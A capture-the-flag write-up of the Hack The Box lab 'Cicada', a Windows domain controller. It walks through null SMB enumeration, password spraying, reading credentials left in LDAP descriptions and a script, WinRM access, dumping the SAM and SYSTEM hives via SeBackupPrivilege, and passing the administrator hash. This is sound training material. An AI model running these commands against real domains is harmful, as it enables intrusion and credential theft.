+++
title = "HTB - Cicada"
date = 2026-01-14
+++

Originally done 10/04/24

Cicada is a very smooth introduction to the very basics of enumerating Active Directory services. We'll authenticate to SMB as null user, find credentials, re-enumerate and laterally move a bit before landing on the box via WinRM. Then, we abuse `SEBackupPrivilege` to dump local SAM and SYSTEM hives, after which we can jump back onto the box as administrator. Let's get cooking.

### Scan
```
Nmap scan report for 10.10.11.35
Host is up (0.12s latency).
Not shown: 65522 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-03 23:26:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
57094/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m00s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-10-03T23:26:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 373.81 seconds

```

### Enumeration
Given our scan, we immediately know we're dealing with a domain controller. We've got the `FQDN` and the common ports and services associated with them, like LDAP, RPC, Kerberos, etc. These usually allow the DC to carry out functions and tasks necessary to administer a domain, like authentication, communication, etc. We can add the domain and box to our hosts file with `vim /etc/hosts`. 

Simplifying our workflow is important when trying to get better at enumerating environments and recognizing patterns. For me, on this box it'd look something like DNS -> SMB -> RPC -> LDAP. 

Sometimes, in other environments, the `dig` command allows us to figure out if any other domains or subdomains are registered with the primary one we query against. For this box, this isn't the case.

At the moment, one of my favorite tools for enumeration when working in Active Directory is `netexec`. It's a continuation of `crackmapexec` (which was deprecated in 2023) written in Python. A good number of the original contributors continued to work on the project and add new tools, which eventually culminated in `netexec`. The syntax is very similar for both tools, if you are used to working with one and not the other. 

We can do things like probing network shares or domain users:

`nxc smb 10.129.231.149 -u 'null' -p '' --shares`

`nxc smb 10.129.231.149 -u 'null' -p '' --rid-brute`


<img alt="Image" async src="images/Screenshot 2026-01-13 at 13.06.56.png" width="800px"></img>
<img alt="Image" async src="images/Screenshot 2026-01-13 at 12.40.53.png" width="800px"></img>

We can connect to the shares with `smbclient`:

`smbclient //cicada.htb/[SHARE NAME] -N`

When we get to the HR share, we find a note with credentials:

<img alt="Image" async src="images/Screenshot 2026-01-13 at 13.10.46.png" width="800px"></img>

`Cicada$M6Corpb*@Lp#nZp!8`. Now that we've got a password, we need to throw account names against the credential to find a match. 

Remember the users we queried for earlier? Take those names and place in a list.

<img alt="Image" async src="images/Screenshot 2026-01-13 at 13.13.27.png" width="800px"></img>

See if any match: 

`nxc smb 10.129.231.149 -u /home/li0t/Desktop/HTB/Cicada/users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'`

<img alt="Image" async src="images/Screenshot 2026-01-13 at 13.44.26.png" width="800px"></img>

The password belongs to `michael.wrightson`. Now that we know, we can try and authenticate to other services. 

A good way of getting a lay of the land when it comes to configurations in an active directory environment is through `LDAP` queries. Lightweight Domain Access Protocol was designed for computers to access domain information about each other. We can use a tool called `ldapdomaindump` that will collect useful data for us and output the information in a myriad of formats, including `HTML`, `JSON`, and greppable outputs. 

`ldapdomaindump --user cicada.htb\\michael.wrightson --password 'Cicada$M6Corpb*@Lp#nZp!8' -m 10.129.231.149`

<img alt="Image" async src="images/Screenshot 2026-01-13 at 13.48.42.png" width="800px"></img>

I like to peruse findings in browser.

<img alt="Image" async src="images/Screenshot 2026-01-13 at 20.55.00.png" width="800px"></img>

See anything interesting?

<img alt="Image" async src="images/Screenshot 2026-01-13 at 20.56.56.png" width="800px"></img>

David keeps his password in his Domain Account description... Not a very good move.

`david.orelious:aRt$Lp#7t*VQ!3`

Whenever there are new credentials, it's important to re-enumerate the environment we're in, i.e. trying to get access to services and information that may have been off limits beforehand.

<img alt="Image" async src="images/Screenshot 2026-01-13 at 21.18.45.png" width="800px"></img>

`nxc smb 10.129.231.149 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares`

In this case, we now have got read access on the `DEV` share.

<img alt="Image" async src="images/Screenshot 2026-01-13 at 21.20.05.png" width="800px"></img>

There's a backup PowerShell script here, which we can bring back to our box and pick apart.

```Powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"
```

Again, we notice the hardcoded credentials. `emily.oscars:Q!3@Lp#M6b*7t*Vt`

Seems to be the main theme on the box, and is very bad practice in any environment. The script is pretty straight forward, as it simply backs up the SMB share to the `D:` drive. Emily Oscars must have special privileges to do this, which is why the script authenticates with her credentials. Recall our LDAP findings:

<img alt="Image" async src="images/Screenshot 2026-01-13 at 21.31.55.png" width="800px"></img>

She's the backup operator for the domain, as well as a remote management user - which likely points to our next move with said credentials.

### Initial Access

Looking back at our NMAP scan, recall that port `5985` is open. This means we're able to take advantage of moving onto the box (with valid credentials) via `winrm` over HTTP. A popular tool for doing so is called `evilwinrm`:

`evil-winrm -i 10.129.231.149 -u "emily.oscars" -p 'Q!3@Lp#M6b*7t*Vt'`

<img alt="Image" async src="images/Screenshot 2026-01-13 at 21.42.45.png" width="800px"></img>

Once on the box, we can use `whoami /priv` to see what privileges we've got as the current user.

<img alt="Image" async src="images/Screenshot 2026-01-13 at 21.43.37.png" width="800px"></img>

In most cases, these will be hit or miss. You can see the description of each named privilege in the center column. Some are more useful than others, and some are outright dangerous when afforded to compromised users. 

Here, we're able to back up files and directories through `SEBackupPrivilege`. This is dangerous because we can save the SAM and SYSTEM hives, which are used by the Security Account Manager to store usernames and hashes. We can dump them to files and exfiltrate them as needed:

```
reg save hklm\sam SAM
reg save hklm\system SYSTEM

download SAM
download SYSTEM
```

<img alt="Image" async src="images/Screenshot 2026-01-13 at 22.12.58.png" width="800px"></img>

We eyeball if they were exfiltrated correctly by the number of bytes.

### Privilege Escalation

From here, we can dump the secrets to get the local administrator hash:

`cp /opt/impacket/build/scripts-3.12/secretsdump.py .`
`python3 secretsdump.py -system SYSTEM -sam SAM LOCAL`.

<img alt="Image" async src="images/Screenshot 2026-01-13 at 22.16.36.png" width="800px"></img>

Pass the hash as the local administrator to jump back onto the box:

`evil-winrm -i 10.10.11.35 -u "administrator" -H '2b87e7c93a3e8a0ea4a581937016f341'`

<img alt="Image" async src="images/Screenshot 2026-01-13 at 22.18.44.png" width="800px"></img>






